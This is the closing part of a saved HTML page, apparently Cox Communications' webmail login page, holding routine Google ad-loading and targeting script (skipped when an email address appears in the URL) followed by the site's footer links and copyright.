		var re = /^.*(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))(@|%40)((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,})).*$/;
		var url = window.location.href.toLowerCase();
		var emailMatch=re.test(url);
		
		if(!emailMatch)
		{                              
	
			var googletag = googletag || {}; 
			googletag.cmd = googletag.cmd || [];
																		
			(function() {
			 var gads = document.createElement('script');
			 gads.async = true;
			 gads.type = 'text/javascript';

			 var useSSL = 'https:' == document.location.protocol;
			 gads.src = (useSSL ? 'https:' : 'http:') + '//www.googletagservices.com/tag/js/gpt.js';

			 var node = document.getElementsByTagName('script')[0];
			 node.parentNode.insertBefore(gads, node);
			 })();
				
			if(!window.console) console = { log: function(){} };

			function getCoxSiteCookie(c_name) {
			if (document.cookie.length>0) {
			c_start=document.cookie.indexOf(c_name + "=");
			if (c_start!=-1) {
				c_start=c_start + c_name.length+1;
				c_end=document.cookie.indexOf(";",c_start);
				if (c_end==-1) c_end=document.cookie.length;
					return unescape(document.cookie.substring(c_start,c_end));
				}
			}
			return "";
		}
			
			coxSite = getCoxSiteCookie("cox-current-site");
			if(coxSite && coxSite != '""') {
				siteId = coxSite;
			} else {
				siteId = "national";
			}
		
		
			var segmentStr = "";
			if (bmi) {
				bmi.segments.getSegments({
					timeoutMs: 1000,
					publisherId: "52ac4a92-fb84-4f60-a518-13cd6da99f3d",
					callback: function(segments) {
						if (segments.length > 0) {
							segmentStr = ";segments=" + segments.join(',');
						}
					}
				});
			}

			randomizer = Math.floor(Math.random() * 99999999999999)
		
			// custom per login page
			var zoneStr = "webmail";
			var pageStr = "myconnection-webmail";
			var curURL = location.protocol + '//' + location.host + location.pathname;
				curURL = encodeURIComponent(curURL);
		
			googletag.cmd.push(function() {
			googletag.defineSlot('/131/'+siteId+'.cox.com', [300, 250], 'ad01').addService(googletag.pubads());
			googletag.pubads().setTargeting('zone',[zoneStr]);
			googletag.pubads().setTargeting('pg',[pageStr]);
			googletag.pubads().setTargeting('rg',[siteId]);
			googletag.pubads().setTargeting('dc_ref',[curURL]);
			googletag.pubads().setTargeting('ord',[randomizer+segmentStr]);
			googletag.pubads().enableSingleRequest();
			googletag.pubads().collapseEmptyDivs(true);
			googletag.enableServices();
			});
	}
	</script>
	
<div id="ad01" style="text-align: center; margin-bottom: 8px;" data-google-query-id="COrE6I-d3d8CFYW8swodPrsEAg">
	<script type="text/javascript"> 
		if(!emailMatch )
        {
			googletag.cmd.push(function() {
			googletag.display("ad01"); 
			});
		}
	</script>
</div>
<!-- /ad -->

	</div>
	<!-- /content -->
</div>
<!-- /content-frame -->
<!-- INTERWOVEN FILE CLOSE: /coxmain/webmail/login.html -->
 </div>
 

<!--
   SiteCatalyst code version: H.1.
   Copyright 1997-2005 Omniture, Inc.
   More info available at http://www.omniture.com
-->

<!--
   End SiteCatalyst code version: H.1.
-->
<!-- PF-COMPONENT-END:content --><!-- OPEN PF PLUGIN: contentarea-suffix -->

<!-- CLOSE PF PLUGIN: contentarea-suffix --></div>
<!-- PF-COMPONENT-BEGIN:footer --><div id="pf-footer">


<!-- top footer --><div class="pf-top-footer"><div class="pf-top-footer-inner pf-constrain-width"><!-- footer column content --><div class="pf-footer-content pf-clearfix">
<ul>
<li class="pf-footer-content-header">I want to...</li>
<li><a href="http://www.cox.com/ibill/home.cox" title="View &amp; Pay My Bill">View &amp; Pay My Bill</a></li>
<li><a href="http://www.cox.com/resaccount/home.cox" title="Manage My Account settings">Manage My Account</a></li>
<li><a href="http://www.cox.com/resaccount/tools.cox" title="Use Phone Tools, Internet Tools and TV Tools">Use My Services Tools</a></li>
<li><a href="http://www.cox.com/myconnection/watch/entertainment/tv-listings.cox" title="See TV Listings and schedule DVR recordings">See TV Listings</a></li>
<li><a href="http://webmail.cox.net/" title="Check My WebMail">Check My WebMail</a></li>
</ul>
<ul>
<li class="pf-footer-content-header">&nbsp;</li>
<li><a href="http://www.cox.com/residential/tv/watch-tv-online.html" title="Watch TV Online">Watch TV Online</a></li>
<li><a href="http://www.cox.com/myconnection/watch/entertainment/tv-listings.cox" title="Set DVR Recording">Set DVR Recording</a></li>
<li><a href="http://www.cox.com/residential/tv/tv-apps.html" title="Get Cox Apps">Get Cox Apps</a></li>
<li><a href="http://myconnection.cox.com/" title="My Connection Customer home page">See What's Happening on My Connection</a></li>
</ul>
<ul class="pf-footer-skip-col">
<li class="pf-footer-content-header">Shop</li>
<li><a href="http://www.cox.com/residential/special-offers/bundles.html" title="Bundles &amp; Promotions">Bundles &amp; Promotions</a></li>
<li><a href="http://www.cox.com/residential/tv.html" title="Contour® &amp; TV">Contour® &amp; TV</a></li>
<li><a href="http://www.cox.com/residential/internet.html" title="Internet">Internet</a></li>
<li><a href="http://www.cox.com/residential/phone.html" title="Home Phone">Home Phone</a></li>
<li><a href="http://www.cox.com/residential/homelife.html" title="Cox Home Security service">Homelife</a></li>
</ul>
<ul class="pf-footer-skip-col">
<li class="pf-footer-content-header">About Cox</li>
<li><a href="http://www.cox.com/aboutus/home.html" title="About Us Home Page">About Us Home</a></li>
<li><a href="http://newsroom.cox.com/" title="Newsroom">Newsroom</a></li>
<li><a href="http://www.cox.com/aboutus/take-charge.html" title="Take Charge!">Take Charge!</a></li>
<li><a href="http://www.cox.com/aboutus/careers.html" title="Careers">Careers</a></li>
<li><a href="http://www.zerochaos.com/cox/index.htm" title="Contract Positions at Cox">Contract Positions</a></li>
</ul>
<ul>
<li class="pf-footer-content-header">&nbsp;</li>
<li><a href="http://www.cox.com/aboutus/diversity.html" title="Diversity">Diversity</a></li>
<li><a href="http://www.cox.com/aboutus/suppliers.html" title="Supplier Relations">Supplier Relations</a></li>
<li><a href="http://www.coxmedia.com/contact.jsp?navigation=7" title="Advertise with Us for TV, Online, Digital and Print">Advertise with Us</a></li>
<li><a href="http://www.cox.com/aboutus/contact-us/cox-centers.html" title="Retail &amp; Payment Locations">Retail &amp; Payment Locations</a></li>
</ul>
</div></div></div><!-- /top footer --><!-- bottom footer --><div class="pf-bottom-footer"><div class="pf-bottom-footer-inner pf-constrain-width"><!-- footer other businesses section --><div class="pf-other-businesses pf-clearfix"> 
<ul>
<li><a href="http://www.coxmedia.com/" title="Cox Media">Cox Media</a></li>
<li><a href="http://www.coxenterprises.com/" title="Cox Enterprises">Cox Enterprises</a></li>
<li><a href="http://www.kudzu.com/" title="Kudzu">Kudzu</a></li>
</ul> 
<!-- options for easy readability like changing font size and language --> 
<div class="pf-easy-read"><a title="Font Zoom" href="https://idm.west.cox.net/coxlogin/ui/webmail?TYPE=33554432&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-NIMXSvKfy%2bUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3a%2f%2fwebmail%2ewest%2ecox%2enet%2f#" class="pf-text-size pf-text-active" id="pf-style-font-small">A</a><a title="Font Zoom" href="https://idm.west.cox.net/coxlogin/ui/webmail?TYPE=33554432&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-NIMXSvKfy%2bUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3a%2f%2fwebmail%2ewest%2ecox%2enet%2f#" class="pf-text-size" id="pf-style-font-medium">A</a><a title="Font Zoom" href="https://idm.west.cox.net/coxlogin/ui/webmail?TYPE=33554432&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-NIMXSvKfy%2bUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3a%2f%2fwebmail%2ewest%2ecox%2enet%2f#" class="pf-text-size" id="pf-style-font-large">A</a> 
</div><!-- social media icons section --><div class="pf-social-icons">
<a target="_blank" href="http://www.youtube.com/user/CoxCommTV" title="YouTube" class="pf-social-you-tube">YouTube</a>
<a target="_blank" href="https://www.facebook.com/coxcommunications" title="Facebook" class="pf-social-facebook">Facebook</a>
<a target="_blank" href="https://twitter.com/coxcomm" title="Twitter" class="pf-social-twitter">Twitter</a>
<a target="_blank" href="https://plus.google.com/u/0/+coxcommunications/posts" title="Google+" class="pf-social-google-plus">Google+</a>
</div></div><!-- section containing general info like policies, agreements and copyrights --> 
<div class="pf-general-info pf-clearfix"> 
<ul>
<li><a href="http://www.cox.com/aboutus/policies.html" title="Policies">Policies</a></li>
<li><a href="http://www.cox.com/aboutus/policies/online-privacy-policy.html" title="Privacy Statement and Policy">Privacy Statement</a></li>
<li><a href="http://www.cox.com/aboutus/policies/your-privacy-rights.cox#ads" title="About Our Advertising">About Our Ads</a></li>
</ul><div class="pf-copyright">
© 1998-2019 Cox Communications, Inc.
</div></div></div></div><!-- /bottom footer --></div><!-- PF-COMPONENT-END:footer -->

</div>
<!-- PF-COMPONENT-END:container --><!-- PF-COMPONENT-BEGIN:appendix -->
<!-- PF-COMPONENT-BEGIN:cross-domain -->

<!-- PF-COMPONENT-END:cross-domain -->

<!-- OPEN PF PLUGIN: footer-commands -->

<!-- CLOSE PF PLUGIN: footer-commands -->
<!-- OPEN PF PLUGIN: body-suffix -->

<!-- CLOSE PF PLUGIN: body-suffix --><!-- PF-COMPONENT-END:appendix --></body></html>